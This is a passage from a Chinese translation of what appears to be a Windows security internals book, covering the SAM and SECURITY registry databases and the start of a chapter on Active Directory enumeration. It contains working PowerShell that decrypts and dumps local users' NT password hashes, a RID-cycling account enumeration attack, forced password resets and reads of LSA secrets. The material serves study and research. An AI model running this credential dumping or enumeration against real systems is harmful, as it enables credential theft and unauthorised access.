     for($i = 7; $i -ge 0; $i--) {
         $curr = ($k -shr ($i * 7)) -band 0x7F
         $b = $curr
         $b = $b -bxor ($b -shr 4)
         $b = $b -bxor ($b -shr 2)
         $b = $b -bxor ($b -shr 1)
         ($curr -shl 1) -bxor ($b -band 0x1) -bxor 1
     }
}
```


*代码清单 10-32：为 RID 生成 DES 密钥*

解密哈希的第一步是基于 RID 的值生成两个 64 位的 DES 密钥。在 代码清单 10-32 中，我们将 RID 解包为两个 56 位的数组，作为两个密钥的基础。然后，我们通过取数组的每 7 位并为每个字节计算一个奇偶校验位，将每个 56 位的数组扩展为 64 位。奇偶校验位设置在每个字节的最低有效位，以确保每个字节具有奇数个位。

有了这两个密钥，我们就可以完全解密哈希。首先我们需要一些函数，这些函数在 代码清单 10-33 中定义。




```
PS> function Unprotect-DES([byte[]]$Key, [byte[]]$Data, [int]$Offset) {
    $des = [Security.Cryptography.DES]::Create()
    $des.Key = $Key
    $des.Mode = "ECB"
    $des.Padding = "None"
    $des.CreateDecryptor().TransformFinalBlock($Data, $Offset, 8)
}

PS> function Unprotect-PasswordHashDES([byte[]]$Hash, [uint32]$Rid) {
    $keys = Get-UserDESKey -Rid $Rid
    (Unprotect-DES -Key $keys[0] -Data $Hash -Offset 0) +
    (Unprotect-DES -Key $keys[1] -Data $Hash -Offset 8)
}
```


*代码清单 10-33：使用 DES 解密密码哈希*

我们首先定义一个简单的DES解密函数。该算法使用DES在电子密码本（ECB）模式下运行，且不进行填充。接着，我们定义一个函数来解密哈希。第一个8字节块使用第一个密钥解密，第二个块使用第二个密钥解密。之后，我们将解密后的哈希拼接成一个16字节的结果。

最后，我们可以解密密码哈希并将其与真实值进行比较，如代码清单 10-34所示。



```
PS> Unprotect-PasswordHashDES -Hash $nt_dec -Rid 500 | Out-HexDump
51 1A 3B 26 2C B6 D9 32 0E 9E B8 43 15 8D 85 22

PS> Get-MD4Hash -String "adminpwd" | Out-HexDump
51 1A 3B 26 2C B6 D9 32 0E 9E B8 43 15 8D 85 22
```


*代码清单 10-34：验证NT哈希*

如果哈希被正确解密，我们应预期它与用户密码的MD4哈希匹配。在此例中，用户密码设置为*adminpwd*（我知道，这不够强）。解密后的NT哈希与生成的哈希完全匹配。

现在，让我们查看存储LSA策略的SECURITY数据库。我们不会在这个数据库上花费太多时间，因为我们可以使用本章前面描述的域策略远程服务直接提取其大部分信息。

#### 检查SECURITY数据库

LSA策略存储在SECURITY数据库注册表键中，位于*REGISTRY\MACHINE\SECURITY*。与SAM数据库注册表键一样，只有*SYSTEM*用户可以直接访问该键，但我们可以使用代码清单 10-21中的映射驱动器提供程序来检查其内容。

代码清单 10-35显示了SECURITY数据库注册表键的几个层级。请以管理员身份运行此命令。



```
PS> ls -Depth 1 -Recurse SEC:\SECURITY
❶ SECURITY\Cache                            Key
SECURITY\Policy                           Key
SECURITY\RXACT                            Key
❷ SECURITY\SAM                              Key
❸ SECURITY\Policy\Accounts                  Key
SECURITY\Policy\CompletedPrivilegeUpdates Key
SECURITY\Policy\DefQuota                  Key
SECURITY\Policy\Domains                   Key
SECURITY\Policy\LastPassCompleted         Key
SECURITY\Policy\PolAcDmN                  Key
SECURITY\Policy\PolAcDmS                  Key
❹ SECURITY\Policy\PolAdtEv                  Key
❺ SECURITY\Policy\PolAdtLg                  Key
SECURITY\Policy\PolDnDDN                  Key
SECURITY\Policy\PolDnDmG                  Key
SECURITY\Policy\PolDnTrN                  Key
SECURITY\Policy\PolEKList                 Key
SECURITY\Policy\PolMachineAccountR        Key
SECURITY\Policy\PolMachineAccountS        Key
SECURITY\Policy\PolOldSyskey              Key
SECURITY\Policy\PolPrDmN                  Key
SECURITY\Policy\PolPrDmS                  Key
SECURITY\Policy\PolRevision               Key
❻ SECURITY\Policy\SecDesc                   Key
❼ SECURITY\Policy\Secrets                   Key
```


*代码清单 10-35：列出SECURITY数据库注册表键的内容*

我们只讨论其中几个注册表键。*Cache*键❶包含一个缓存域凭据列表，即使失去对域控制器的访问权限，也可用于验证用户身份。我们将在第12章讨论交互式身份验证时介绍此键的用途。

*SAM*键❷是指向完整SAM数据库注册表键的链接，其内容已在代码清单 10-21中展示。此处存在该链接是为了方便使用。*Policy\Accounts*键❸用于存储策略的账户对象。*Policy*键还包含其他系统策略和配置；例如，*PolAdtEv*❹和*PolAdtLg*❺包含与系统审计策略相关的配置，我们在第9章中已分析过这些配置。

保护策略对象的安全描述符位于*Policy\SecDesc*键❻中。策略中的每个可安全对象都有一个类似的键来持久化安全描述符。

最后，*Policy\Secrets*键❼用于存储秘密对象。我们在代码清单 10-36中进一步探讨*Secrets*键的子项。您需要以管理员身份运行这些命令。



```
❶ PS> ls SEC:\SECURITY\Policy\Secrets
Name         TypeName
----         --------
$MACHINE.ACC Key
DPAPI_SYSTEM Key
NL$KM        Key

❷ PS> ls SEC:\SECURITY\Policy\Secrets\DPAPI_SYSTEM
Name     TypeName
----     --------
CupdTime Key
CurrVal  Key
OldVal   Key
OupdTime Key
SecDesc  Key

PS> $key = Get-Item SEC:\SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal
❸ PS> $key.DefaultValue.Data | Out-HexDump -ShowAll
          00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF
-----------------------------------------------------------------------------
00000000: 00 00 00 01 5F 5D 25 70 36 13 17 41 92 57 5F 50  - ...._]%p6..A.W_P
00000010: 89 EA AA 35 03 00 00 00 00 00 00 00 DF D6 A4 60  - ...5...........`
00000020: 5B FB EE B2 04 04 1E A9 E9 5B FA 77 85 5E 57 07  - ........[.w.^W.
00000030: CC 2A 53 BF 2A 84 E0 88 86 B9 7A 55 E7 63 79 6C  - .*S.*.....zU.cyl
00000040: 8A 72 85 67 31 BD 52 3E 11 E0 49 A6 AE 9B BE B5  - .r.g1.R>..I.....
00000050: 21 15 F0 1D 75 C3 F8 CA 46 CC 4A 58 B3 9C 4F 1E  - !...u...F.JX..O.
00000060: D9 8B 61 6C A4 A0 77 18 F1 42 61 43 C6 12 CE 22  - ..al..w..BaC..."
00000070: 03 EC 80 1B 51 07 F7 16 50 CD 04 71              - ....Q...P..q
```


*代码清单 10-36：枚举* SECURITY\Policy\Secrets *键的子项*

[代码清单 10-36列出了*Secrets*键的子键❶。每个子键的名称是使用域策略远程服务打开秘密时使用的字符串。例如，我们可以在输出中看到在代码清单 10-17中访问的*DPAPI_SYSTEM*秘密。

当我们检查该键的值❷时，会发现其当前值和旧值及时间戳，以及秘密对象的安全描述符。秘密的内容存储为键中的默认值，因此我们可以将其显示为十六进制❸。您可能会注意到，秘密的值与我们通过域策略远程服务转储的值不同。与用户对象数据一样，LSA会尝试混淆注册表中的值，以防止内容被轻易泄露。系统密钥被使用，但采用了不同的算法；我不会进一步深入探讨其细节。

### 实际示例

让我们通过一些示例来演示如何利用本章介绍的各种命令进行安全研究或系统分析。

#### RID 循环枚举

在“名称查找与映射”一节中，我提到了一种名为 RID 循环枚举的攻击，它利用域策略远程服务来发现计算机上的用户和组，而无需访问SAM远程服务。在代码清单 10-37中，我们使用本章介绍的一些命令来执行此攻击。




```
PS> function Get-SidNames {
     param(
      ❶ [string]$Server,
         [string]$Domain,
         [int]$MinRid = 500,
         [int]$MaxRid = 1499
     )
     if ("" -eq $Domain) {
        $Domain = $Server
     }
❷ Use-NtObject($policy = Get-LsaPolicy -SystemName $Server -Access 
LookupNames) {
     ❸ $domain_sid = Get-LsaSid $policy "$Domain\" 
     ❹ $sids = $MinRid..$MaxRid | ForEach-Object {
           Get-NtSid -BaseSid $domain_sid -RelativeIdentifier $_
       }
     ❺ Get-LsaName -Policy $policy -Sid $sids | Where-Object NameUse 
-ne "Unknown" 
    }
}

❻ PS> Get-SidNames -Server "CINNABAR" | Select-Object QualifiedName, Sddl
QualifiedName               Sddl
-------------               ----
CINNABAR\Administrator      S-1-5-21-2182728098-2243322206-2265510368-500
CINNABAR\Guest              S-1-5-21-2182728098-2243322206-2265510368-501
CINNABAR\DefaultAccount     S-1-5-21-2182728098-2243322206-2265510368-503
CINNABAR\WDAGUtilityAccount S-1-5-21-2182728098-2243322206-2265510368-504
CINNABAR\None               S-1-5-21-2182728098-2243322206-2265510368-513
CINNABAR\LocalAdmin         S-1-5-21-2182728098-2243322206-2265510368-1000
```


*代码清单 10-37：一个简单的RID循环枚举实现*

首先，我们定义执行RID循环枚举攻击的函数。我们需要四个参数❶：要枚举的服务器、要枚举的服务器中的域，以及要检查的最小和最大RID值。查找过程一次只能请求1,000个SID，因此我们设置一个默认范围，从500到1499（包含），这应该覆盖用户账户和组使用的RID范围。

接下来，我们打开策略对象并请求LookupNames访问权限❷。我们需要通过域的简单名称来查找其SID❸。有了域SID，我们就可以为每个要暴力枚举的RID创建相对SID，并查找它们的名称❹。如果返回对象的NameUse属性设置为Unknown，则该SID未映射到用户名❺。通过检查此属性，我们可以从枚举结果中过滤掉无效用户。

最后，我们在本地域网络上的另一台系统上测试此函数❻。你需要能够对服务器进行身份验证才能执行攻击。在加入域的系统上，这应该是理所当然的。但是，如果你的机器是独立系统，攻击可能会因缺少身份验证凭据而失败。

#### 强制更改用户密码

在SAM数据库的用户对象讨论中，我提到如果调用者在用户对象上获得ForcePasswordChange访问权限，他们就可以强制更改用户的密码。代码清单 10-38展示了如何使用本章描述的命令来实现这一点。




```
PS> function Get-UserObject([string]$Server, [string]$User) {
     Use-NtObject($sam = Connect-SamServer -ServerName $Server) {
         Use-NtObject($domain = Get-SamDomain -Server $sam -User) {
             Get-SamUser -Domain $domain -Name $User -Access ForcePasswordChange
          }
      }
}

PS> function Set-UserPassword([string]$Server, [string]$User, [bool]$Expired) {
     Use-NtObject($user_obj = Get-UserObject $Server $User) {
         $pwd = Read-Host -AsSecureString -Prompt "New Password"
         $user_obj.SetPassword($pwd, $Expired)
     }
}
```


*代码清单 10-38：通过SAM远程服务强制更改用户密码*

我们首先定义一个辅助函数，用于在指定服务器上打开用户对象。我们使用User参数打开用户域，并显式请求ForcePasswordChange访问权限，如果未授予该权限，将生成拒绝访问的错误。

然后，我们定义一个设置密码的函数。我们将从控制台读取密码，因为它需要采用安全字符串格式。Expired参数将密码标记为需要在用户下次身份验证时更改。从控制台读取密码后，我们在用户对象上调用SetPassword函数。

我们可以通过以管理员身份运行代码清单 10-39中的脚本来测试密码设置函数。




```
PS> Set-UserPassword -Server $env:COMPUTERNAME "user"
New Password: *********
```


*代码清单 10-39：在当前计算机上设置用户密码*

要获得ForcePasswordChange访问权限，你需要是目标计算机上的管理员。在这种情况下，我们以本地管理员身份运行。但是，如果你想更改远程用户的密码，则需要以远程计算机上的管理员身份进行身份验证。

#### 提取所有本地用户哈希

在“通过注册表访问 SAM 数据库”一节中，我们定义了从 SAM 数据库解密用户密码哈希的函数。要以管理员身份自动使用这些函数解密所有本地用户的密码，请运行代码清单 10-40。




```
❶ PS> function Get-PasswordHash {
    param(
        [byte[]]$Pek,
        $Key,
        $Rid,
        [switch]$LmHash
    )
    $index = 14
    $type = 2
    if ($LmHash) {
        $index = 13
        $type = 1
    }
    $hash_enc = Get-VariableAttribute $key -Index $Index
    if ($null -eq $hash_enc) {
        return @()
    }
    $hash_dec = Unprotect-PasswordHash -Key $Pek -Data $hash_enc -Rid $Rid
-Type $type
    if ($hash_dec.Length -gt 0) {
        Unprotect-PasswordHashDES -Hash $hash_dec -Rid $Rid
    }
}

❷ PS> function Get-UserHashes {
    param(
        [Parameter(Mandatory)]
        [byte[]]$Pek,
        [Parameter(Mandatory, ValueFromPipeline)]
        $Key
    )

    PROCESS {
        try {
            if ($null -eq $Key["V"]) {
                return
            }
            $rid = [int]::Parse($Key.Name, "HexNumber")
            $name = Get-VariableAttribute $key -Index 1

            [PSCustomObject]@{
                Name=[System.Text.Encoding]::Unicode.GetString($name)
                LmHash = Get-PasswordHash $Pek $key $rid -LmHash
                NtHash = Get-PasswordHash $Pek $key $rid
                Rid = $rid
            }
        } catch {
            Write-Error $_
        }
    }
}

❸ PS> $pek = Unprotect-PasswordEncryptionKey
❹ PS> ls "SEC:\SAM\SAM\Domains\Account\Users" | Get-UserHashes $pek
Name               LmHash NtHash                  Rid
----               ------ ------                  ---
Administrator                                     500
Guest                                             501
DefaultAccount                                    503
WDAGUtilityAccount        {125, 218, 222, 22...}  504
admin                     {81, 26, 59, 38...}     1001
```


*代码清单 10-40：解密所有本地用户的密码哈希*

我们首先定义一个函数，用于从用户的注册表项中解密单个密码哈希❶。我们根据LmHash参数选择要提取的哈希，该参数会更改RC4密钥的索引和类型。然后，我们从Get-UserHashes函数❷中调用此函数，该函数提取其他信息（如用户名）并构建自定义对象。

要使用Get-UserHashes函数，我们首先解密密码加密密钥❸，然后枚举注册表中的用户账户并将其通过管道传递给该函数❹。从输出中可以看出，只有两个用户具有NT密码哈希，并且没有用户配置了LM哈希。

### 总结

本章从Windows域身份验证的讨论开始。我们探讨了不同层次的复杂性，从独立计算机上的本地域开始，逐步深入到网络域和林。每个复杂性层次都有相应的配置，可以通过访问这些配置来确定身份验证域中可用的用户和/或组。

接下来，我们检查了各种内置的PowerShell命令，用于检查本地系统上的身份验证配置。例如，`Get-LocalUser`命令会列出所有已注册的用户，以及他们是否已启用。我们还了解了如何添加新用户和组。

然后，我们研究了LSA策略，该策略用于配置各种安全属性（如第9章中所述的审计策略）、用户被分配的特权以及用户可以执行的身份验证类型。

接着，我们探讨了如何在本地或远程系统上通过SAM远程服务和域策略服务网络协议来访问配置。如您所见，我们通常认为的组在内部被称为别名。

本章最后，我们深入探讨了身份验证配置如何存储在注册表中，以及如何对其进行基本检查。我们还看了一个如何从注册表中提取用户哈希密码的示例。

在下一章中，我们将类似地探讨身份验证配置如何存储在Active Directory配置中，这比本地配置的情况要复杂得多。

## 11. Active Directory

前一章描述了本地域的身份验证配置。在本章中，我们将详细说明 Active Directory 如何存储企业网络域中的用户和组配置。我们将首先通过使用各种PowerShell命令来检查域配置，这些命令可以枚举配置的信任关系、用户和组。然后，我们将深入探讨 Active Directory 的结构，以及如何通过网络访问其原始信息。

一旦你理解了 Active Directory 的结构，我们将探讨 Windows 如何确定谁可以检查和修改它。正如你将看到的，与大多数 Windows 平台组件一样，Active Directory 使用安全描述符来授予或拒绝访问配置的权限。

### Active Directory 简史

在Windows 2000之前，企业网络的用户配置存储在网络的域控制器上的SAM数据库中。域控制器使用Netlogon协议对用户进行身份验证，该协议依赖于MD4密码哈希格式。要修改SAM数据库，你可以使用上一章所述的SAM远程服务。该服务允许管理员在域控制器上添加或删除用户和组。

随着企业网络变得越来越复杂，SAM数据库格式被证明有其局限性。Windows 2000对企业网络进行了彻底改革，将用户配置迁移到 Active Directory，并将主要身份验证协议从Netlogon改为Kerberos。

Active Directory 相比 SAM 数据库提供了多项优势，因为它具有可扩展性，可以存储任意数据。例如，管理员可以在用户配置中存储额外信息以表示其安全级别，应用程序在授予或拒绝资源访问权限时可以检查这些信息。Active Directory 还具有细粒度的安全性，允许管理员比SAM更容易地将配置的部分内容委派给不同用户。

Active Directory 存储在域控制器本地，网络中的计算机可以使用*轻量目录访问协议（LDAP）*访问它，该协议在TCP/IP网络连接上暴露端口389。LDAP源自更复杂的*目录访问协议（DAP）*，后者是X.500目录服务规范的一部分。如果你熟悉用于在安全网站上交换公钥信息的X.509证书格式，那么以下一些概念可能会让你感到熟悉。

### 探索 Active Directory 域与 PowerShell

让我们从域配置的高层概览开始探索 Active Directory。图 11-1 展示了一个示例林（当然，你的配置可能有所不同）。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure11-1.webp)

图 11-1：一个 Windows 林示例

为了探索这个林，我们将运行各种 PowerShell 命令来枚举其域、用户、组和设备。如果你想跟着操作，可以在附录 A 中找到类似域配置的设置说明。

#### 远程服务器管理工具

我们可以通过 PowerShell 的 ActiveDirectory 模块与 Active Directory 服务器交互，该模块随可选的远程服务器管理工具（RSAT）Windows 功能一起提供。默认情况下，只有域控制器安装了 RSAT，因为这些命令是为管理目录而设计的（并非每个客户端系统都需要执行此操作）。

因此，在运行本章的示例脚本之前，你可能需要安装 RSAT。如果你运行的是 Windows 10 版本 1809 之前的 Windows 版本，则必须从 Microsoft 网站下载 RSAT。如果你使用的是较新版本的 Windows，可以通过在管理员 PowerShell 控制台中运行代码清单 11-1 中的命令来安装 RSAT。




```
PS> $cap_name = Get-WindowsCapability -Online |
Where-Object Name -Match 'Rsat.ActiveDirectory.DS-LDS.Tools'
PS> Add-WindowsCapability -Name $cap_name.Name -Online
```


*代码清单 11-1：安装远程服务器管理工具*

请注意，除非你在已加入 Windows 企业网络的计算机上运行命令（例如附录 A 中描述的网络），否则本节中的示例将无法正常工作。

#### 基本林和域信息

让我们首先收集有关我们连接到的林和域的一些基本信息。你可以通过在示例林的根 *mineral.local* 域中的计算机上执行代码清单 11-2 中的命令来跟着操作。




```
❶ PS> $forest = Get-ADForest
❷ PS> $forest.Domains
mineral.local
sales.mineral.local
engineering.mineral.local

❸ PS> $forest.GlobalCatalogs
PRIMARYDC.mineral.local
SALESDC.sales.mineral.local
ENGDC.engineers.mineral.local

❹ PS> Get-ADDomain | Format-List PDCEmulator, DomainSID, DNSRoot, NetBIOSName
PDCEmulator : PRIMARYDC.mineral.local
DomainSID   : S-1-5-21-1195776225-522706947-2538775957
DNSRoot     : mineral.local
NetBIOSName : MINERAL

❺ PS> Get-ADDomainController | Select-Object Name, Domain
Name      Domain
----      ------
PRIMARYDC mineral.local

❻ PS> Get-ADTrust -Filter * | Select-Object Target, Direction, TrustType
Target                     Direction       TrustType
------                     ---------       ---------
engineering.mineral.local  BiDirectional   Uplevel
sales.mineral.local        BiDirectional   Uplevel
```


*代码清单 11-2：列出有关林和域的一些基本信息*

我们首先使用 Get-ADForest 命令请求有关当前林的信息 ❶。返回的对象具有许多属性，但这里我们关注其中两个。Domains 属性返回林中域的域名系统（DNS）名称列表 ❷。在此示例中，它与图 11-1 中的林匹配。我们还检查 GlobalCatalogs 属性，该属性列出了所有维护共享全局目录副本的系统 ❸。我们可以使用这些信息来检查林级配置。

然后我们运行 Get-ADDomain 命令，该命令返回有关当前系统所连接域的信息 ❹。在这里，我们选择四个属性。第一个是 PDCEmulator，即*主域控制器（PDC）模拟器*的 DNS 名称。PDC 曾经是本地域中的主域控制器，曾作为权威用户数据库。（备份域控制器作为辅助数据库，以防 PDC 宕机。）随着 Active Directory 的引入，无需 PDC 即可更均匀地分配身份验证工作负载。然而，Windows 仍然给予 PDC 模拟器优先处理；例如，当你更改密码时，操作系统总是会首先尝试在 PDC 上更改。PDC 还运行旧版 Netlogon 服务，以与旧版 Windows 向后兼容。

下一个属性是 DomainSID。此 SID 用作域中所有其他用户和组 SID 的基础。它等同于我们在第 10 章中看到的机器 SID，但它适用于整个网络。最后两个属性是 DNSRoot 和 NetBIOSName。这些是域的根 DNS 名称和简单域名，Windows 出于遗留支持原因保留它们。

这种遗留支持的一个典型例子涉及域中用户的命名方式。正式来说，您应使用完全限定名称来引用用户，即*用户主体名称（UPN）*，其形式为*alice@mineral.local*。然而，在您登录计算机时使用的用户界面中，通常不会输入UPN作为用户名；相反，您会输入类似*MINERAL\alice*的内容，我们称之为*下级登录名*。

接下来，我们使用Get-ADDomainController命令❺列出系统所连接域上的域控制器。我们检查的是一个简单域，因此代码清单 11-2中仅包含一个条目PRIMARYDC。但如前所述，林包含多个域。我们可以使用Get-ADTrust命令❻枚举配置的信任关系。输出显示所有信任关系均为双向。第三列标识每个域的类型：Uplevel表示该域同样基于Active Directory，而Downlevel值则代表Windows 2000之前的域。

#### 用户

现在，我们列出存储在Active Directory服务器上的用户账户信息。我们可以使用Get-ADUser命令来实现，如代码清单 11-3所示。




```
PS> Get-ADUser -Filter * | Select-Object SamAccountName, Enabled, SID
SamAccountName Enabled SID
-------------- ------- ---
Administrator     True S-1-5-21-1195776225-522706947-2538775957-500
Guest            False S-1-5-21-1195776225-522706947-2538775957-501
krbtgt           False S-1-5-21-1195776225-522706947-2538775957-502
bob               True S-1-5-21-1195776225-522706947-2538775957-1108
alice             True S-1-5-21-1195776225-522706947-2538775957-1110
```


*代码清单 11-3：显示Active Directory服务器上的用户*

使用Get-ADUser类似于使用Get-LocalUser，但您需要指定一个过滤器。在代码清单 11-3中，我们指定*以获取所有用户，但在真实网络中，您会发现过滤对于减少输出至关重要，因为Active Directory服务器可能包含成百上千个用户。

输出显示每个用户的纯用户名（在SamAccountName列中）、用户是否启用以及其SID。与本地用户一样，每个SID都有一个公共前缀，应与代码清单 11-2中的域SID匹配。

用户的密码存储在Active Directory服务器上的一个特殊只写属性中。我们无法从域控制器外部读取此密码，除非通过目录备份或在域控制器之间复制目录时。

#### 组

要列出Active Directory服务器中的安全组，我们可以使用Get-ADGroup命令（代码清单 11-4）。




```
PS> Get-ADGroup -Filter * | Select-Object SamAccountName, SID, GroupScope
SamAccountName    SID                                           GroupScope
--------------    ---                                           ----------
Administrators    S-1-5-32-544                                  DomainLocal
Users             S-1-5-32-545                                  DomainLocal
Guests            S-1-5-32-546                                  DomainLocal
--snip--
Enterprise Admins S-1-5-21-1195776225-522706947-2538775957-519  Universal
Cert Publishers   S-1-5-21-1195776225-522706947-2538775957-517  DomainLocal
Domain Admins     S-1-5-21-1195776225-522706947-2538775957-512  Global
Domain Users      S-1-5-21-1195776225-522706947-2538775957-513  Global
--snip--
```


*代码清单 11-4：显示Active Directory服务器上的组*

注意，输出包括*BUILTIN*组（如*Administrators*）和域组（如*Enterprise Admins*）。您可以根据组SID前缀使用的域SID轻松区分这些组类型。在此示例中，域SID前缀为S-1-5-21-1195776225-522706947-2538775957。

系统仅在用户向域控制器进行身份验证时使用*BUILTIN*组。例如，将用户添加到*BUILTIN\Administrators*组将授予该用户对域控制器上数据库的管理员访问权限，但不会授予网络中任何其他机器。另一方面，域组在用户进行身份验证时会被添加到用户的令牌中，并可用于本地计算机上的访问检查。

域组可以具有三种可能的作用域。全局组作用域对整个林可见。虽然林中的任何域都可以使用该组，但它仅包含定义域中的用户或组。全局组等同于我们在上一章中介绍的SAM配置中的组对象。相比之下，域本地组仅在定义域中可见，但它可以包含来自任何受信任域的任何用户或组。它等同于SAM数据库中的别名对象。

通用组作用域结合了其他两种作用域的全局可见性和广泛成员资格：此作用域中的组对整个林可见，并且可以包含任何用户或组。

为了突出通用组和全局组作用域之间的区别，让我们考虑*Enterprise Admins*和*Domain Admins*这两个组之间的差异。*Enterprise Admins*包括所有可以管理林的用户。虽然此组应该只有一个实例，定义在根域中，但您可能希望能够在整个林中添加任何用户作为成员。因此，正如您在代码清单 11-4中所见，它是一个通用组。所有域都可以使用它，并且它可以包含任何人。

相反，*Domain Admins* 包含的是单个域的管理员用户。其他域可能会将该组作为资源使用（如果配置为允许其访问），但其成员资格仅限于定义该域的域。因此，它是一个全局组。如果你只管理单个域，这些作用域之间的差异并不特别重要。

当你枚举别名对象时，SAM 远程服务会返回域本地组，而在枚举组对象时，则返回通用组和全局组。你可能会觉得奇怪，为什么该服务将通用组作为组对象返回；毕竟，用于操作组对象成员的 API 允许你仅使用域的相对 ID 指定成员，这阻止了你通过 SAM 远程服务修改包含域外成员的通用组。无论如何，你都不应真正使用 SAM 远程服务来管理 Active Directory 域。

你可以使用 `Get-ADGroupMember` 命令列出 Active Directory 服务器组的成员，如 代码清单 11-5 所示。




```
PS> Get-ADGroupMember -Identity Administrators | Select Name, objectClass
Name              objectClass
----              -----------
Domain Admins     group
Enterprise Admins group
Administrator     user

PS> Get-LocalGroupMember -Name Administrators
ObjectClass Name                   PrincipalSource
----------- ----                   ---------------
Group       MINERAL\Domain Admins  ActiveDirectory
User        MINERAL\alice          ActiveDirectory
User        GRAPHITE\admin         Local
User        GRAPHITE\Administrator Local
```


*代码清单 11-5：显示加入域后的* Administrators *组成员*

在这里，我们枚举了域控制器上 *BUILTIN\Administrators* 组的成员。由于这是一个 *BUILTIN* 组，用户只有在向域控制器进行身份验证后才会获得该组的成员资格。

然而，当你将计算机加入域时，可以修改该计算机上的本地组以包含域组。例如，当我们使用 `Get-LocalGroupMember` 列出本地 *BUILTIN\Administrators* 组的成员时，会看到域中的 *Domain Admins* 组已被添加为成员。此更改允许域中的所有管理员成为域内任何计算机上的本地管理员。

#### 计算机

当你将计算机加入域时，会在域中创建一个账户。这些特殊的用户账户在任何用户向系统进行身份验证之前，就授予计算机访问某些域服务的权限。计算机账户对于配置组策略以及向系统验证用户身份尤为重要，我们将在 第14章 中看到。

你可以使用 `Get-ADComputer` 命令列出 Active Directory 服务器上的计算机账户，如 代码清单 11-6 所示。




```
PS> Get-ADComputer -Filter * | Select-Object SamAccountName, Enabled, SID
SamAccountName Enabled SID
-------------- ------- ---
PRIMARYDC$        True S-1-5-21-1195776225-522706947-2538775957-1000
GRAPHITE$         True S-1-5-21-1195776225-522706947-2538775957-1104
CINNABAR$         True S-1-5-21-1195776225-522706947-2538775957-1105
TOPAZ$            True S-1-5-21-1195776225-522706947-2538775957-1106
PYRITE$           True S-1-5-21-1195776225-522706947-2538775957-1109
HEMATITE$         True S-1-5-21-1195776225-522706947-2538775957-1113
```


*代码清单 11-6：显示计算机账户的 SID*

如输出所示，计算机账户名称通常以美元符号（$）结尾，这使得区分计算机账户和用户账户变得容易。我们还可以再次看到，SID 使用域 SID 作为前缀。（计算机本身继续在本地 SAM 数据库中存储其独立的机器 SID。）

计算机账户需要密码才能向域进行身份验证，而加入域的计算机和域控制器会自动管理此密码。默认情况下，计算机每 30 天生成一个新的复杂密码，并在域控制器上更改它。由于计算机必须在没有用户交互的情况下更改密码，因此它将密码存储在名为 `$MACHINE.ACC` 的 LSA 秘密对象中。

代码清单 11-7 展示了如何使用 `Get-LsaPrivateData` 命令查询计算机的 LSA 秘密。你需要以管理员身份运行此命令。它与我们在上一章中看到的 `Get-LsaSecret` 命令类似，只是我们无需手动打开策略和秘密对象。




```
PS> Get-LsaPrivateData '$MACHINE.ACC' | Out-HexDump -ShowAll
          00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF
-----------------------------------------------------------------------------
00000000: 00 00 00 01 5F 5D 25 70 36 13 17 41 92 57 5F 50  - ...._]%p6..A.W_P
00000010: 89 EA AA 35 03 00 00 00 00 00 00 00 94 B1 CD 81  - ...5............
00000020: 98 86 67 2A 31 17 1B E1 2F 5D 78 48 7B ED 0C 95  - ..g*1.../]xH{...
--snip--
```




*代码清单 11-7：查询 $MACHINE.ACC LSA 秘密*

LSA 会混淆秘密对象的内容，因此仅读取该值不足以提取用于计算机账户的密码。

我们已经对 Active Directory 服务器配置进行了高层探索。现在让我们从低层查看目录的配置方式，以便理解其安全机制。

### 对象与可分辨名称

尽管我们可以使用ActiveDirectory模块中的命令来访问用户配置，但这些命令掩盖了Active Directory服务器的真实结构，该结构由条目的层次树组成，如图11-2所示。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure11-2.webp)

图11-2：Active Directory服务器的结构

条目类型有几种，但我们只关心存储用户配置的*对象*。为了引用树中的对象，我们使用其*可分辨名称*，该名称在目录中必须是唯一的。可分辨名称是由逗号分隔的一个或多个*相对可分辨名称*组成的序列。在Active Directory服务器中，您最可能遇到以下相对可分辨名称类型：

C   国家/地区名称

CN  通用名称

DC  域组件

O   组织名称

OU  组织单位名称

ST  州或省名称

例如，在目录的根处是域对象❶，其域名为DC=mineral,DC=local。DC相对可分辨名称表示DNS名称的一部分域组件。综合起来，该可分辨名称代表域的*mineral.local* DNS名称。

在根对象之下是描述域配置的对象树。我在图11-2中仅展示了其中三个。CN指通用名称，即对象的简单标签。CN=Users对象❷包含域的用户和组对象。另外两个对象CN=Builtin和CN=Computers分别包含域控制器上*BUILTIN*域的组账户和计算机账户列表。

要引用Users对象，您需要使用其完整的可分辨名称CN=Users,DC=mineral,DC=local。每个用户对象可以包含更多对象，但更常见的是它们仅包含代表用户配置的属性值列表❸。例如，用户对象可能包含userPrincipalName属性，表示用户在Active Directory服务器中的UPN。

每个对象还可以包含一个objectGUID属性，其中包含唯一标识该对象的GUID。尽管可分辨名称是唯一的，但它不能始终如一地标识对象，因为如果对象被移动或重命名，可分辨名称会改变。即使可分辨名称更改，objectGUID属性也保持不变。

两个独立的根对象存储域根的管理信息。它们是配置对象❹和架构对象❺。配置对象中存储的信息对Active Directory安全至关重要，而架构对象定义了目录的结构。我们将在后续章节中更深入地讨论这两个对象。

#### 枚举目录对象

Active Directory服务器的默认安装使用众所周知的可分辨名称、配置和架构对象。但是，管理员可以更改这些名称或向数据库添加新目录。因此，Active Directory服务器暴露了一个称为*根目录系统代理特定条目（RootDSE）*的特殊目录条目，其中包含目录的高级配置。

代码清单 11-8展示了如何使用Get-ADRootDSE命令访问当前域的RootDSE条目。




```
PS> Get-ADRootDSE | Format-List '*NamingContext'
configurationNamingContext : CN=Configuration,DC=mineral,DC=local
defaultNamingContext       : DC=mineral,DC=local
rootDomainNamingContext    : DC=mineral,DC=local
schemaNamingContext        : CN=Schema,CN=Configuration,DC=mineral,DC=local
```


*代码清单 11-8：检查当前域的RootDSE条目*

作为属性，我们选择*命名上下文*的可分辨名称，这些命名上下文代表目录中的顶级对象。使用这些命名上下文，我们可以使用Get-ADObject命令查询Active Directory服务器上的对象（代码清单 11-9）。




```
❶ PS> $root_dn = (Get-ADRootDSE).defaultNamingContext
❷ PS> Get-ADObject -SearchBase $root_dn -SearchScope OneLevel -Filter * |
Select-Object DistinguishedName, ObjectClass
DistinguishedName                                ObjectClass
-----------------                                -----------
❸ CN=Builtin,DC=mineral,DC=local                   builtinDomain
CN=Computers,DC=mineral,DC=local                 container
